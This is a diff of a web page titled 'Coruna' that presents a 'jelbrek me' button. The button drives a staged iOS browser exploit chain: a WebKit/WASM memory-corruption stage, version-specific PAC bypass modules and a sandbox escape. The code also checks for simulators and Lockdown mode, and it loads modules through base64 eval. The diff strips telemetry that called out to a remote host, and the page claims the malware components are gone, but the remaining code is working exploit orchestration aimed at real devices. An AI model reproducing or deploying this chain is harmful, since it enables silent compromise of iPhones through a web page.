@@ -4,21 +4,382 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     <meta property="og:determiner" content="auto" />
-    <title>group</title>
+    <title>Coruna</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            margin-top: 60px;
+            font-size: 42px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-top: 6px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .status-card {
+            margin-top: 30px;
+            width: 100%;
+            background: #111;
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid #222;
+        }
+
+        .status-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #333;
+            transition: background 0.3s;
+        }
+
+        .status-dot.waiting { background: #555; }
+        .status-dot.running { background: #f0ad4e; animation: pulse 1.2s infinite; }
+        .status-dot.success { background: #5cb85c; }
+        .status-dot.error { background: #d9534f; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .status-text {
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .log-area {
+            width: 100%;
+            max-height: 180px;
+            overflow-y: auto;
+            font-family: 'SF Mono', 'Menlo', monospace;
+            font-size: 11px;
+            color: #888;
+            line-height: 1.6;
+            scrollbar-width: none;
+        }
+
+        .log-area::-webkit-scrollbar { display: none; }
+
+        .log-line {
+            padding: 1px 0;
+            word-break: break-all;
+        }
+
+        .log-line.highlight { color: #667eea; }
+        .log-line.error { color: #d9534f; }
+        .log-line.success { color: #5cb85c; }
+
+        .go-btn {
+            margin-top: 24px;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            color: #fff;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .go-btn:active { transform: scale(0.97); }
+        .go-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+        .progress-bar {
+            margin-top: 16px;
+            width: 100%;
+            height: 4px;
+            background: #222;
+            border-radius: 2px;
+            overflow: hidden;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .progress-bar.active { opacity: 1; }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 2px;
+            transition: width 0.4s ease;
+        }
+
+        .divider {
+            margin-top: 32px;
+            width: 40px;
+            height: 2px;
+            background: #222;
+            border-radius: 1px;
+        }
+
+        .credits-section {
+            margin-top: 28px;
+            width: 100%;
+        }
+
+        .credits-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .credits-grid {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .credit-tag {
+            padding: 6px 14px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 20px;
+            font-size: 13px;
+            color: #999;
+            text-decoration: none;
+            transition: border-color 0.2s, color 0.2s;
+        }
+
+        .credit-tag:active { border-color: #444; color: #ccc; }
+
+        .made-by {
+            margin-top: 28px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .made-by-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+
+        .made-by-names {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .made-by-tag {
+            padding: 6px 14px;
+            background: linear-gradient(135deg, rgba(102,126,234,0.15), rgba(118,75,162,0.15));
+            border: 1px solid rgba(102,126,234,0.3);
+            border-radius: 20px;
+            font-size: 13px;
+            color: #a8b4f0;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .made-by-tag:active { border-color: rgba(102,126,234,0.6); color: #c8d0f8; }
+
+        .version-warning {
+            display: none;
+            margin-top: 20px;
+            width: 100%;
+            background: rgba(217, 83, 79, 0.1);
+            border: 1px solid rgba(217, 83, 79, 0.3);
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 13px;
+            color: #e88;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .version-warning.show { display: block; }
+
+        .footer {
+            margin-top: 32px;
+            margin-bottom: 40px;
+            text-align: center;
+            font-size: 11px;
+            color: #333;
+            line-height: 1.6;
+        }
+    </style>
 </head>
 
 <body>
+    <div class="container">
+        <div class="logo">Coruna</div>
+        <div class="subtitle">iOS 13.0 &ndash; 17.2.1</div>
 
+        <div class="version-warning" id="versionWarning">
+            Your iOS version is higher than 17.2.1. The exploit will not work on your device, but you can still view the page.
+        </div>
 
-    <!-- <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-    <script>eruda.init();</script> -->
+        <div class="status-card">
+            <div class="status-header">
+                <div class="status-dot waiting" id="statusDot"></div>
+                <div class="status-text" id="statusText">Ready</div>
+            </div>
+            <div class="log-area" id="logArea"></div>
+        </div>
+
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <canvas id="glCanvas" width="1" height="1" style="display:none"></canvas>
+
+        <button class="go-btn" id="goBtn" onclick="startExploit()">jelbrek me</button>
+
+        <div class="divider"></div>
+
+        <div class="made-by">
+            <div class="made-by-title">Made by</div>
+            <div class="made-by-names">
+                <a class="made-by-tag" href="https://github.com/34306" target="_blank">34306</a>
+                <a class="made-by-tag" href="https://github.com/khanhduytran0" target="_blank">Duy Tran</a>
+                <a class="made-by-tag" href="https://github.com/asdfugil" target="_blank">Nick Chan</a>
+            </div>
+        </div>
+
+        <div class="credits-section">
+            <div class="credits-title">Thanks to</div>
+            <div class="credits-grid">
+                <a class="credit-tag" href="https://github.com/wh1te4ever/" target="_blank">wh1te4ever</a>
+                <a class="credit-tag" href="https://github.com/alfiecg24" target="_blank">Alfie</a>
+                <span class="credit-tag">Clarity</span>
+                <a class="credit-tag" href="https://www.youtube.com/c/BillyEllis" target="_blank">Billy Ellis</a>
+                <a class="credit-tag" href="https://github.com/matteyeux/" target="_blank">matteyeux</a>
+                <a class="credit-tag" href="https://github.com/verygenericname/" target="_blank">Nathan</a>
+                <span class="credit-tag">helthydriver</span>
+                <a class="credit-tag" href="https://github.com/staturnzz" target="_blank">saturnz</a>
+                <a class="credit-tag" href="https://github.com/opa334" target="_blank">opa334</a>
+                <a class="credit-tag" href="https://github.com/hrtowii" target="_blank">hrtowii</a>
+                <a class="credit-tag" href="https://github.com/dlevi309" target="_blank">daniel</a>
+            </div>
+        </div>
+
+        <div style="margin-top:16px; padding:12px 16px; font-size:12px; color:#888; line-height:1.5; text-align:center;">
+            We've reverse engineered and removed all the malware components &mdash; it's safe to run.<br>
+            Source: <a href="https://github.com/khanhduytran0/coruna" target="_blank" style="color:#a8b4f0;">github.com/khanhduytran0/coruna</a>
+        </div>
+
+        <div class="footer">
+            Vibe coded web site UI, for fun and research only :P
+        </div>
+    </div>
 
     <script src="platform_module.js"></script>
     <script src="utility_module.js"></script>
     <script type="text/javascript">
-        window.addDownloadBinary = function (fileName, text) {
-            let fileType = "application/octet-stream";
+        // ============================================================================
+        // UI Helpers
+        // ============================================================================
+
+        // Check iOS version and show warning if > 17.2.1
+        (function() {
+            var ua = navigator.userAgent;
+            var match = ua.match(/OS (\d+)_(\d+)(?:_(\d+))? /);
+            if (match) {
+                var major = parseInt(match[1], 10);
+                var minor = parseInt(match[2], 10);
+                var patch = match[3] ? parseInt(match[3], 10) : 0;
+                // Outside supported ranges: 13.0–17.2.1, 18.0–18.x, 26.0–26.x
+                var supported = (major >= 13 && (major < 17 || (major === 17 && minor < 2) || (major === 17 && minor === 2 && patch <= 1)))
+                    || (major === 18)
+                    || (major === 26);
+                if (!supported) {
+                    document.getElementById('versionWarning').classList.add('show');
+                }
+            } else if (!/iPhone|iPad|iPod/.test(ua)) {
+                // Not an iOS device at all - show warning
+                document.getElementById('versionWarning').classList.add('show');
+                document.getElementById('versionWarning').textContent = 'This tool is designed for iOS 13.0\u201317.2.1, 18.x, and 26.x devices only. You can still view the page.';
+            }
+        })();
+
+        var exploitStarted = false;
+        var progressValue = 0;
+
+        function setStatus(text, state) {
+            document.getElementById('statusText').textContent = text;
+            var dot = document.getElementById('statusDot');
+            dot.className = 'status-dot ' + state;
+        }
+
+        function setProgress(pct) {
+            progressValue = pct;
+            document.getElementById('progressFill').style.width = pct + '%';
+        }
+
+        window.log = function(text) {
+            var area = document.getElementById('logArea');
+            var line = document.createElement('div');
+            line.className = 'log-line';
+            if (text.indexOf('error') !== -1 || text.indexOf('Error') !== -1 || text.indexOf('ABORT') !== -1 || text.indexOf('FAILED') !== -1) {
+                line.className += ' error';
+            } else if (text.indexOf('complete') !== -1 || text.indexOf('succeeded') !== -1 || text.indexOf('success') !== -1 || text.indexOf('active') !== -1) {
+                line.className += ' success';
+            } else if (text.indexOf('Loading') !== -1 || text.indexOf('starting') !== -1 || text.indexOf('Selecting') !== -1) {
+                line.className += ' highlight';
+            }
+            line.textContent = text;
+            area.appendChild(line);
+            area.scrollTop = area.scrollHeight;
+        };
+
+        window.addDownloadBinary = function(fileName, text) {
+            var fileType = "application/octet-stream";
             var blob = new Blob([text], { type: fileType });
             var a = document.createElement('a');
             a.download = fileName;
@@ -26,19 +387,18 @@
             a.dataset.downloadurl = [fileType, a.download, a.href].join(':');
             a.text = "Download " + fileName;
             document.body.appendChild(a);
-        }
-        window.log = function (text) {
-            const newLineElement = document.createElement('p');
-            newLineElement.textContent = text;
-            document.body.append(newLineElement);
         };
+
+        // ============================================================================
+        // Module Loader (unchanged logic)
+        // ============================================================================
 
         function fqMaGkNL(W) {
             W = W.toString(16).toLowerCase();
             return 1 === W.length && (W = "0" + W), W
         }
 
-        function fqMaGkN4(arr) { // decodeWords
+        function fqMaGkN4(arr) {
             let out = "";
             for (const q of arr) {
                 const b0 = q & 0xFF;
@@ -54,34 +414,22 @@
         function fqMaGkNg() {
             return fqMaGkN4([1631006510, 960062519, 1647917360, 1647653680, 892756786, 912405041, 1701143141, 1681285477, 1684353382, 1714435941, 1831756386, 1781427817, 115])
         }
+
         window.globalThis = window;
-        // globalThis.moduleManager
         globalThis.moduleManager = (function () {
-            // moduleMap
             let MM = {
                 "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
                 "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0,
             };
-            // moduleCache
-            const e = {
-                "$": "",  // Base URL for remote loading
-                "p": ""   // Salt for SHA256 filename hashing
-            };
+            const e = { "$": "", "p": "" };
 
             function sha256(M) {
                 let I = "";
-
-                function N(M, I) {
-                    return M >>> I | M << 32 - I
-                }
-                const D = Math.pow,
-                    g = D(2, 32),
-                    T = ([89, 80, 91, 82, 65, 93].map(x => {
-                        return String.fromCharCode(x ^ 53);
-                    }).join(""));
+                function N(M, I) { return M >>> I | M << 32 - I }
+                const D = Math.pow, g = D(2, 32),
+                    T = ([89, 80, 91, 82, 65, 93].map(x => String.fromCharCode(x ^ 53)).join(""));
                 let c, d;
-                const L = [],
-                    b = 8 * M[T];
+                const L = [], b = 8 * M[T];
                 let i = sha256.h = sha256.h || [];
                 const y = sha256.k = sha256.k || [];
                 let C = y[T];
@@ -90,19 +438,16 @@
                     if (!X[M]) {
                         for (c = 0; c < (1499680357 ^ 1499680604); c += M) X[c] = M;
                         i[C] = D(M, .5) * g | 0, y[C++] = D(M, 1 / 3) * g | 0
-                    } for (M += "\x80"; M[T] % 64 - 56;) M += "\0";
+                    }
+                for (M += "\x80"; M[T] % 64 - 56;) M += "\0";
                 for (c = 0; c < M[T]; c++) {
                     if (d = M.charCodeAt(c), d >> 8) return;
                     L[c >> 2] |= d << (3 - c) % 4 * 8
                 }
                 for (L[L[T]] = b / g | 0, L[L[T]] = b, d = 0; d < L[T];) {
-                    const M = L.slice(d, d += 16),
-                        I = i;
+                    const M = L.slice(d, d += 16), I = i;
                     for (i = i.slice(0, 8), c = 0; c < 64; c++) {
-                        const I = M[c - 15],
-                            D = M[c - 2],
-                            g = i[0],
-                            T = i[4],
+                        const I = M[c - 15], D = M[c - 2], g = i[0], T = i[4],
                             d = i[7] + (N(T, 6) ^ N(T, 11) ^ N(T, 25)) + (T & i[5] ^ ~T & i[6]) + y[c] + (M[c] = c < 16 ? M[c] : M[c - 16] + (N(I, 7) ^ N(I, 18) ^ I >>> 3) + M[c - 7] + (N(D, 17) ^ N(D, 19) ^ D >>> 10) | 0);
                         i = [d + ((N(g, 2) ^ N(g, 13) ^ N(g, 22)) + (g & i[1] ^ g & i[2] ^ i[1] & i[2])) | 0].concat(i), i[4] = i[4] + d | 0
                     }
@@ -119,33 +464,24 @@
             function c(M) {
                 if (M in e == !1) {
                     if (M in MM != !0) throw new Error("M in MM != !0");
-                    {
-                        //                    const I =MM[M]);
-                        //                    e[M] = new Function(I)()
-                        // decoded base64:
-                        window.log("Load " + M);
-                        e[M] = MM[M]();
-                    }
+                    window.log("Load " + M);
+                    e[M] = MM[M]();
                 }
                 return e[M]
             }
+
             return {
                 hPL3On: this.getModuleByName,
                 ZKvD0e: this.getModuleByURL,
                 fgPoij: this.evalBase64Module,
-                setBaseUrl: function (M) {
-                    e.$ = M
-                },
-                setSalt: function (M) {
-                    e.p = M
-                },
+                setBaseUrl: function (M) { e.$ = M },
+                setSalt: function (M) { e.p = M },
                 getModuleByName: c,
                 getModuleByURL: async function (moduleId) {
-                    window.log(`[LOADER] Loading module: ${moduleId}...`);
+                    window.log("[LOADER] Loading module: " + moduleId + "...");
                     if (moduleId in e == !1 && moduleId in MM == !1) {
                         let I = moduleId;
-                        //I = SHA256(moduleCache.p + M).substring(0, 40);
-                        I = moduleId; // de-randomize
+                        I = moduleId;
                         const N = await async function (M) {
                             window.log("Loading " + M);
                             return new Promise(((I, N) => {
@@ -153,13 +489,10 @@
                                 let g;
                                 const T = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
                                 g = new URL((e.$) + (M));
-                                const c = Math.random().toString(36).slice(2, T(5, 10)),
-                                    d = T(0, 1);
+                                const c = Math.random().toString(36).slice(2, T(5, 10)), d = T(0, 1);
                                 g.searchParams.set(c, d),
                                     D.open("GET", g.toString(), !0),
-                                    D.responseType = ([66, 83, 78, 66].map(x => {
-                                        return String.fromCharCode(x ^ 54);
-                                    }).join("")),
+                                    D.responseType = ([66, 83, 78, 66].map(x => String.fromCharCode(x ^ 54)).join("")),
                                     D.onreadystatechange = () => {
                                         if (D.readyState === XMLHttpRequest.DONE)
                                             if (200 === D.status) {
@@ -174,424 +507,210 @@
                     }
                     return c(moduleId)
                 },
-                evalCode: function (M, I) {
-                    M in e == !1 && (e[M] = I())
-                },
-                evalBase64Module: function (M, I) {
-                    M in e == !1 && (e[M] = new Function(atob(I))())
-                },
+                evalCode: function (M, I) { M in e == !1 && (e[M] = I()) },
+                evalBase64Module: function (M, I) { M in e == !1 && (e[M] = new Function(atob(I))()) },
             };
         })();
-        globalThis.obChTK = globalThis.moduleManager; // MARK: alias
+
+        globalThis.obChTK = globalThis.moduleManager;
         const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
             platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
-        let baseUrl = utilityModule.Ot(fqMaGkNg());
-        baseUrl = baseUrl.slice(0, baseUrl.lastIndexOf("/") + 1);
+        let baseUrl = window.location.origin + window.location.pathname.slice(0, window.location.pathname.lastIndexOf("/") + 1);
         globalThis.moduleManager.setBaseUrl(baseUrl);
         globalThis.moduleManager.setSalt("cecd08aa6ff548c2");
 
-        function fqMaGkNr(W) {
-            var C = fqMaGkN4([]);
-            if ("" !== C) {
-                const q = utilityModule.Ot(C);
-                q && (C = new XMLHttpRequest, W = q + "?e=" + W, C.open("GET", W, !0), C.send())
-            }
-        }
+        // Telemetry removed
+        function fqMaGkNr(W) { }
 
         // ============================================================================
         // PAC Bypass Loader
         // ============================================================================
 
-        /**
-         * Load the appropriate PAC bypass stage based on iOS version flags.
-         * Selects between different stage2 module variants.
-         * Original: fqMaGkNO
-         * @returns {Promise<object>} PAC bypass module with ga() factory method
-         */
         async function loadPACBypass() {
-            window.log(`[PAC] Selecting PAC bypass variant...`);
+            window.log("[PAC] Selecting PAC bypass variant...");
+            setProgress(50);
 
             const offsets = globalThis.moduleManager.getModuleByName(
                 "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
             ).platformState.versionFlags;
 
-            // Select PAC bypass variant based on version-specific flags
-            if (offsets.wF8NpI) {
-                // iOS 17.0+ path: Load stage2 pre-requisite, then main stage
-                await (await globalThis.moduleManager.getModuleByURL(
-                    // Hash: "477db22c8e27d5a7bd72ca8e4bc502bdca6d0aba" (stage2 pre-req)
-                    "Stage2_16.6_17.2.1_seedbell_pre"
-                )).ul();
-                pacModule = await globalThis.moduleManager.getModuleByURL(
-                    // Hash: "29b874a9a6cc9fa9d487b31144e130827bf941bb" (stage2 main)
-                    "Stage2_17.0_17.2.1_seedbell"
-                );
+            if (offsets.Hm7RvN) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
+            } else if (offsets.Yt3FsK) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_18.0_18.x_thornvine");
+            } else if (offsets.wF8NpI) {
+                await (await globalThis.moduleManager.getModuleByURL("Stage2_16.6_17.2.1_seedbell_pre")).ul();
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_17.0_17.2.1_seedbell");
             } else if (offsets.LJ1EuL) {
-                // Alternate iOS 17 path
-                await (await globalThis.moduleManager.getModuleByURL(
-                    // Hash: "477db22c8e27d5a7bd72ca8e4bc502bdca6d0aba"
-                    "Stage2_16.6_17.2.1_seedbell_pre"
-                )).ul();
-                pacModule = await globalThis.moduleManager.getModuleByURL(
-                    // Hash: "9db8a84aa7caa5665f522873f49293e8eebccd5c"
-                    // FIXME: validate this
-                    "Stage2_16.6_16.7.12_seedbell"
-                );
+                await (await globalThis.moduleManager.getModuleByURL("Stage2_16.6_17.2.1_seedbell_pre")).ul();
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_16.6_16.7.12_seedbell");
             } else if (offsets.CpDW_T) {
-                pacModule = await globalThis.moduleManager.getModuleByURL(
-                    // Hash: "171a7da1934de9e0efb9c1645f4575f88e482873"
-                    // 16.3-16.5.1
-                    "Stage2_16.3_16.5.1_seedbell"
-                );
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_16.3_16.5.1_seedbell");
             } else if (offsets.IqxL92) {
-                pacModule = await globalThis.moduleManager.getModuleByURL(
-                    // Hash: "91b278ddb2aec817b10c1535e0963da74f9b8eeb"
-                    "Stage2_15.0_16.2_breezy15"
-                );
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_15.0_16.2_breezy15");
             } else {
-                pacModule = await globalThis.moduleManager.getModuleByURL(
-                    // Hash: "b586c88246144bc7975ad4e27ec6d62716bf34ea"
-                    "Stage2_13.0_14.x_breezy"
-                );
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_13.0_14.x_breezy");
             }
 
             if (void 0 === pacModule) throw Error("");
-
-            // ga() creates the PAC bypass instance
+            setProgress(60);
             return pacModule.ga();
         }
 
         // ============================================================================
-        // Main Exploit Trigger
+        // Main Exploit
         // ============================================================================
 
-        /**
-         * Main exploit trigger function.
-         * Original: fqMaGkNR
-         *
-         * Orchestrates the full exploit chain:
-         *   1. Platform detection
-         *   2. Lockdown/simulator checks
-         *   3. Stage 1 (WASM primitives)
-         *   4. Runtime detection
-         *   5. Stage 2 (PAC bypass, if needed)
-         *   6. Stage 3 (sandbox escape + payload)
-         *
-         * @returns {Promise<number>} Status code (0=success, 1000=error, 1001=unsupported, 1003=simulator)
-         */
         async function triggerExploit() {
             var platform = navigator.platform;
             const userAgent = navigator.userAgent;
-            window.log(`[LOADER] === Exploit chain starting ===`);
-            window.log(`[LOADER] Platform: ${platform}, UA: ${userAgent.substring(0, 80)}...`);
 
-            // Initialize platform detection with:
-            //   - Empty telemetry path
-            //   - Script base URL (decoded from fqMaGkNg)
-            //   - Cookie/session data (from fqMaGkN4 with encoded params)
-            //   - Platform and user agent strings
+            setStatus("Initializing...", "running");
+            setProgress(5);
+            window.log("[LOADER] === Exploit chain starting ===");
+            window.log("[LOADER] Platform: " + platform);
+
             if (await platformModule.init("", fqMaGkNg(), "", Array(!1)[0], Array(!1)[0], platform, userAgent), platformModule.On()) throw Error("");
-            window.log(`[PLATFORM] iOS version detected: ${platformModule.platformState.iOSVersion}`);
+            window.log("[PLATFORM] iOS version: " + platformModule.platformState.iOSVersion);
+            setProgress(10);
 
-            // Version check: must be >= 130000 (iOS 13.0)
-            if (13E4 > platformModule.platformState.iOSVersion) return 1001;
-
-            // For iOS 16+, check for simulator
-            if (16E4 <= platformModule.platformState.iOSVersion) {
-                try {
-                    await platformModule.Hn(); // detectSimulatorAsync
-                } catch (p) {
-                    console.error(`[LOADER] ABORT: Simulator check threw`);
-                    return 1001
-                }
-                if (platformModule.platformState.Qn) return 1003; // Simulator detected
-            }
-
-            // Check lockdown mode via IndexedDB Blob test
-            try {
-                await platformModule.Yn();  // detectLockdownAsync
-            } catch (e) {
-                console.error(`[LOADER] ABORT: Lockdown mode check failed`);
+            if (13E4 > platformModule.platformState.iOSVersion) {
+                setStatus("Unsupported version", "error");
                 return 1001;
             }
 
-            // ========================================================================
-            // Stage 1: Load and execute WASM memory primitive exploit
-            // ========================================================================
+            if (16E4 <= platformModule.platformState.iOSVersion) {
+                try { await platformModule.Hn(); } catch (p) { setStatus("Simulator check failed", "error"); return 1001 }
+                if (platformModule.platformState.Qn) { setStatus("Simulator detected", "error"); return 1003; }
+            }
+
+            try { await platformModule.Yn(); } catch (e) { setStatus("Lockdown mode", "error"); return 1001; }
+            setProgress(15);
+
+            // Stage 1
             let stage1Module;
             const offsets = platformModule.platformState.versionFlags;
 
-            // Select stage1 variant based on version-specific flags
-            window.log(`[LOADER] Selecting stage1 variant for offsets: JtEUci=${offsets.JtEUci}, KeCRDQ=${offsets.KeCRDQ}, ShQCsB=${offsets.ShQCsB}, RbKS6p=${offsets.RbKS6p}, mmrZ0r=${offsets.mmrZ0r}`);
-            if (offsets.JtEUci) {
-                // Older iOS path
-                stage1Module = await globalThis.moduleManager.getModuleByURL(
-                    // e3b6ba10484875fabaed84076774a54b87752b8a
-                    "Stage1_16.6_17.2.1_cassowary"
-                );
+            setStatus("Stage 1: WebKit exploit...", "running");
+            window.log("[LOADER] Selecting stage1 variant...");
+
+            if (offsets.Bv9KmR) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
+            } else if (offsets.Xp4WqZ) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_18.0_18.x_manticore");
+            } else if (offsets.JtEUci) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.6_17.2.1_cassowary");
             } else if (offsets.KeCRDQ) {
-                stage1Module = await globalThis.moduleManager.getModuleByURL(
-                    // 57cb8c6431c5efe203f5bfa5a1a83f705cb350b8
-                    "Stage1_16.2_16.5.1_terrorbird"
-                );
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.2_16.5.1_terrorbird");
             } else if (offsets.ShQCsB) {
-                stage1Module = await globalThis.moduleManager.getModuleByURL(
-                    // d11d34e4d96a4c0539e441d861c5783db8a1c6e9
-                    "Stage1_15.6_16.1.2_bluebird"
-                );
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_15.6_16.1.2_bluebird");
             } else if (offsets.RbKS6p) {
-                stage1Module = await globalThis.moduleManager.getModuleByURL(
-                    // ea3da0cfb0a5bdb8c440dd4a963f94cbd39d9e44
-                    "Stage1_15.2_15.5_jacurutu"
-                );
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_15.2_15.5_jacurutu");
             } else if (offsets.mmrZ0r) {
-                stage1Module = await globalThis.moduleManager.getModuleByURL(
-                    // 7d8f5bae97f37aa318bccd652bf0c1dc38fd8396
-                    "7d8f5bae97f37aa318bccd652bf0c1dc38fd8396"
-                );
+                stage1Module = await globalThis.moduleManager.getModuleByURL("7d8f5bae97f37aa318bccd652bf0c1dc38fd8396");
             }
 
-            if (void 0 === stage1Module) { console.error(`[LOADER] ABORT: No stage1 module matched`); return 1001; }
-            window.log(`[LOADER] Stage1 module loaded, executing WASM primitive exploit...`);
+            if (void 0 === stage1Module) { setStatus("No exploit for this version", "error"); return 1001; }
+            setProgress(20);
 
-            // Execute stage1 exploit (builds WASM read/write primitives)
-            // The `si` property is either an async function or sync function
             await (async function executeStage1() {
                 for (let attempt = 0; attempt < 20; attempt++) {
                     try {
-                        window.log(`[LOADER] Stage1 attempt ${attempt + 1}/20...`);
+                        window.log("[LOADER] Stage1 attempt " + (attempt + 1) + "/20...");
+                        setProgress(20 + Math.min(attempt * 1.5, 15));
                         if ("AsyncFunction" === stage1Module.si.constructor.name) {
                             await stage1Module.si();
                         } else {
                             stage1Module.si();
                         }
-                        window.log(`[LOADER] Stage1 succeeded on attempt ${attempt + 1}`);
+                        window.log("[LOADER] Stage1 succeeded on attempt " + (attempt + 1));
                         return;
                     } catch (e) {
                         window.log("[LOADER] Error:" + e.name + ": " + e.message);
-                        console.error(e);
                     }
                 }
-                console.error(`[LOADER] Stage1 FAILED after 20 attempts`);
                 throw Error("");
             })();
 
-            if (!platformModule.platformState.exploitPrimitive) { console.error(`[LOADER] ABORT: WASM primitives not initialized`); throw Error(""); }
-            window.log(`[LOADER] Stage1 complete — WASM read/write primitives active`);
+            if (!platformModule.platformState.exploitPrimitive) throw Error("");
+            setProgress(40);
+            setStatus("Stage 2: PAC bypass...", "running");
 
-            // ========================================================================
-            // Runtime detection + Stage 2 (PAC bypass) + Stage 3 (sandbox escape)
-            // ========================================================================
+            // Stage 2 + 3
             platform = 0;
             try {
-                // Detect JSC runtime type (PSNMWj vs RoAZdq) from memory layout
-                platformModule.lr();  // detectRuntime
-                window.log(`[RUNTIME] JSC runtime detected: PAC=${platformModule.platformState.hasPAC}`);
+                platformModule.lr();
+                window.log("[RUNTIME] PAC=" + platformModule.platformState.hasPAC);
 
-                // If device has PAC (Pointer Authentication), load PAC bypass
                 if (platformModule.platformState.hasPAC) {
-                    window.log(`[PAC] Loading PAC bypass (stage2)...`);
                     platformModule.platformState.pacBypass = await loadPACBypass();
-                    window.log(`[PAC] PAC bypass loaded, checking integrity...`);
-                    platformModule.platformState.qn = await platformModule.$n();  // checkPACIntegrity
-                    window.log(`[PAC] PAC integrity check: ${platformModule.platformState.qn}`);
+                    platformModule.platformState.qn = await platformModule.$n();
                 }
 
-                // Check if wC3yaB flag is set AND PAC integrity check passed
+                setProgress(70);
+                setStatus("Stage 3: Sandbox escape...", "running");
+
                 if (true === offsets.wC3yaB && true === platformModule.platformState.qn) {
-                    // Load stage3 variant A (with PAC bypass)
-                    // Hash: "7f809f320823063b55f26ba0d29cf197e2e333a8"
-                    window.log(`[STAGE3] Loading sandbox escape variant A...`);
-                    platform = await (await globalThis.moduleManager.getModuleByURL(
-                        "Stage3_VariantA"
-                    )).lA();
+                    window.log("[STAGE3] Loading variant A...");
+                    platform = await (await globalThis.moduleManager.getModuleByURL("Stage3_VariantA")).lA();
                 } else {
-                    // Load stage3 variant B (without PAC / different approach)
-                    // Hash: "c03c6f666a04dd77cfe56cda4da77a131cbb8f1c"
-                    window.log(`[STAGE3] Loading sandbox escape variant B...`);
-                    platform = await (await globalThis.moduleManager.getModuleByURL(
-                        "Stage3_VariantB"
-                    )).lA();
+                    window.log("[STAGE3] Loading variant B...");
+                    platform = await (await globalThis.moduleManager.getModuleByURL("Stage3_VariantB")).lA();
                 }
-                window.log(`[STAGE3] Sandbox escape result: ${platform}`);
+
+                setProgress(95);
+                window.log("[STAGE3] Result: " + platform);
             } catch (error) {
-                window.log("[LOADER] Exploit chain error:" + error.name + ": " + error.message);
+                window.log("[LOADER] Error:" + error.name + ": " + error.message);
                 platform = 1000;
                 throw error;
             } finally {
-                // Cleanup exploit primitives
                 if (platformModule.platformState.exploitPrimitive) {
-                    window.log(`[LOADER] Cleaning up exploit primitives...`);
-                    platformModule.platformState.exploitPrimitive.cleanup();  // cleanup()
+                    platformModule.platformState.exploitPrimitive.cleanup();
                 }
             }
 
-            window.log(`[LOADER] === Exploit chain finished — result: ${platform} ===`);
+            setProgress(100);
             return platform;
         }
 
